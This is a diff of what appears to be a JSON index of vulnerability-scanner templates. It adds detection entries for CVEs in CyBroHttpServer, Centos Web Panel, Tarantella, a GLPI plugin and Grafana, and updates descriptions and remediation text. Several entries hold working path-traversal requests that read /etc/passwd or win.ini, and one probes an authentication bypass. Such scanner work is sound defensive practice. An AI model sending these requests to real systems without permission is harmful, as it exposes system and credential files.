@@ -16103,6 +16103,47 @@
       ]
     },
     {
+      "id": "CVE-2018-16133",
+      "info": {
+        "author": "0x_Akoko",
+        "classification": {
+          "cve-id": "CVE-2018-16133",
+          "cvss-metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+          "cvss-score": 5.3,
+          "cwe-id": "CWE-22"
+        },
+        "description": "Cybrotech CyBroHttpServer 1.0.3 allows Directory Traversal in the URI.",
+        "name": "Cybrotech CyBroHttpServer 1.0.3 Directory Traversal",
+        "reference": [
+          "https://packetstormsecurity.com/files/149177/Cybrotech-CyBroHttpServer-1.0.3-Directory-Traversal.html",
+          "http://www.cybrotech.com/",
+          "https://www.cvedetails.com/cve/CVE-2018-16133"
+        ],
+        "severity": "medium",
+        "tags": "cve,cve2018,cybrotech,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "bit app support",
+                "fonts",
+                "extensions"
+              ]
+            }
+          ],
+          "raw": [
+            "GET \\..\\..\\..\\..\\Windows\\win.ini HTTP/1.1\nHost: {{Hostname}}\n"
+          ],
+          "unsafe": true
+        }
+      ]
+    },
+    {
       "id": "CVE-2018-16167",
       "info": {
         "author": "gy741",
@@ -16684,6 +16725,50 @@
       ]
     },
     {
+      "id": "CVE-2018-18323",
+      "info": {
+        "author": "0x_Akoko",
+        "classification": {
+          "cve-id": "CVE-2018-18323",
+          "cvss-metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+          "cvss-score": 7.5,
+          "cwe-id": "CWE-22"
+        },
+        "description": "Centos Web Panel version 0.9.8.480 suffers from code execution, cross site scripting, and local file inclusion vulnerabilities.",
+        "name": "Centos Web Panel 0.9.8.480 LFI",
+        "reference": [
+          "https://packetstormsecurity.com/files/149795/Centos-Web-Panel-0.9.8.480-XSS-LFI-Code-Execution.html",
+          "http://centos-webpanel.com/",
+          "https://www.cvedetails.com/cve/CVE-2018-18323"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2018,centos,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:[x*]:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/admin/index.php?module=file_editor&file=/../../../../../../../../../../../etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2018-18570",
       "info": {
         "author": "emadshanab",
@@ -16979,6 +17064,49 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/index.php?q=file:///etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2018-19753",
+      "info": {
+        "author": "0x_Akoko",
+        "classification": {
+          "cve-id": "CVE-2018-19753",
+          "cvss-metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+          "cvss-score": 7.5,
+          "cwe-id": "CWE-22"
+        },
+        "description": "Tarantella Enterprise versions prior to 3.11 suffer from a directory traversal vulnerability.",
+        "name": "Tarantella Enterprise Directory Traversal",
+        "reference": [
+          "https://packetstormsecurity.com/files/150541/Tarantella-Enterprise-Directory-Traversal.html",
+          "https://www.cvedetails.com/cve/CVE-2018-19753"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2018,tarantella,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:[x*]:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/tarantella/cgi-bin/secure/ttawlogin.cgi/?action=start&pg=../../../../../../../../../../../../../../../etc/passwd"
           ]
         }
       ]
@@ -38424,6 +38552,49 @@
       ]
     },
     {
+      "id": "CVE-2021-39226",
+      "info": {
+        "author": "Evan Rubinstein",
+        "classification": {
+          "cve-id": "CVE-2021-39226",
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+          "cvss-score": 9.8,
+          "cwe-id": "CWE-200"
+        },
+        "description": "Grafana instances up to 7.5.11 and 8.1.5 allow remote unauthenticated users to view the snapshot associated with the lowest database key by accesing the literal paths /api/snapshot/:key or /dashboard/snapshot/:key. If the snapshot is in public mode, unauthenticated users can delete snapshots by accesing the endpoint /api/snapshots-delete/:deleteKey. Authenticated users can delete snapshots by accesing the endpoints /api/snapshots-delete/:deleteKey, or sending a delete request to /api/snappshot/:key, regardless of wether or not the snapshot is set to public mode (disabled by default). Make sure you obtain permission before testing the delete functionality, as this can cause a denial of service. As always, ensure that you test your results manually to ensure your findings are good. Happy Hunting!",
+        "name": "Grafana Snapshot authentication bypass",
+        "reference": [
+          "https://github.com/advisories/GHSA-69j6-29vr-p3j9",
+          "https://nvd.nist.gov/vuln/detail/CVE-2021-39226"
+        ],
+        "severity": "critical",
+        "tags": "cve,cve2021,grafana"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "type": "word",
+              "words": [
+                "\"isSnapshot\":true"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/api/snapshots/:key"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-39316",
       "info": {
         "author": "daffainfo",
@@ -38622,7 +38793,7 @@
           "cvss-score": 9.8,
           "cwe-id": "CWE-287"
         },
-        "description": "ManageEngine ADSelfService Plus version 6113 and prior is vulnerable to REST API authentication bypass with resultant remote code execution.",
+        "description": "ManageEngine ADSelfService Plus version 6113 and prior are vulnerable to a REST API authentication bypass which leads to remote code execution.",
         "name": "ManageEngine ADSelfService Plus version 6113 Unauthenticated RCE",
         "reference": [
           "https://attackerkb.com/topics/DMSNq5zgcW/cve-2021-40539/rapid7-analysis",
@@ -38630,6 +38801,7 @@
           "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-40539",
           "https://github.com/synacktiv/CVE-2021-40539"
         ],
+        "remediation": "Upgrade to ADSelfService Plus build 6114.",
         "severity": "critical",
         "tags": "cve,cve2021,rce,ad,intrusive"
       },
@@ -39959,16 +40131,65 @@
       ]
     },
     {
+      "id": "CVE-2021-43778",
+      "info": {
+        "author": "cckuailong",
+        "classification": {
+          "cve-id": "CVE-2021-43778",
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
+          "cvss-score": 9.1
+        },
+        "description": "Barcode is a GLPI plugin for printing barcodes and QR codes. GLPI instances version 2.x prior to version 2.6.1 with the barcode plugin installed are vulnerable to a path traversal vulnerability. This issue was patched in version 2.6.1. As a workaround, delete the `front/send.php` file..",
+        "name": "GLPI plugin Barcode < 2.6.1 path traversal vulnerability.",
+        "reference": [
+          "https://github.com/AK-blank/CVE-2021-43778",
+          "https://nvd.nist.gov/vuln/detail/CVE-2021-43778"
+        ],
+        "severity": "critical",
+        "tags": "glpi,cve,cve2021,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/glpi/plugins/barcode/front/send.php?file=../../../../../../../../etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-44427",
       "info": {
         "author": "furkansayim,xShuden",
-        "description": "An unauthenticated SQL Injection vulnerability in Rosario Student Information System (aka rosariosis) before 8.1.1 allows remote attackers to execute PostgreSQL statements (e.g., SELECT, INSERT, UPDATE, and DELETE) through /Side.php via the syear parameter.",
+        "classification": {
+          "cve-id": "CVE-2021-44427",
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+          "cvss-score": 9.8,
+          "cwe-id": "CWE-89"
+        },
+        "description": "An unauthenticated SQL Injection vulnerability in Rosario Student Information System (aka rosariosis) 8.1 and below allow remote attackers to execute PostgreSQL statements (e.g., SELECT, INSERT, UPDATE, and DELETE) through /Side.php via the syear parameter.",
         "name": "Rosario Student Information System Unauthenticated SQL Injection",
         "reference": [
           "https://gitlab.com/francoisjacquet/rosariosis/-/issues/328",
           "https://twitter.com/RemotelyAlerts/status/1465697928178122775",
           "https://nvd.nist.gov/vuln/detail/CVE-2021-44427"
         ],
+        "remediation": "Upgrade to version 8.1.1 or higher.",
         "severity": "critical",
         "tags": "cve,cve2021,sqli,rosariosis"
       },
